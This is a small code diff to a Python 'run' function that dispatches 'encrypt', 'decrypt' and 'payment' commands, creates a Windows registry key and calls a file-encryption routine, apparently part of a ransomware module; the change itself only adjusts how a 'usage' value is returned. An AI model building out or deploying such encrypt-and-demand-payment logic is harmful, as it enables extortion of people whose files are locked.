@@ -233,6 +233,7 @@ def run(args=None):
     :param str args:  encrypt, decrypt, payment
 
     """
+    global usage
     if args:
         cmd, _, action = str(args).partition(' ')
         if 'payment' in cmd:
@@ -242,4 +243,4 @@ def run(args=None):
         elif 'encrypt' in cmd:
             reg_key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, registry_key)
             return encrypt_files(action)
-    return globals()['usage']
+    return usage
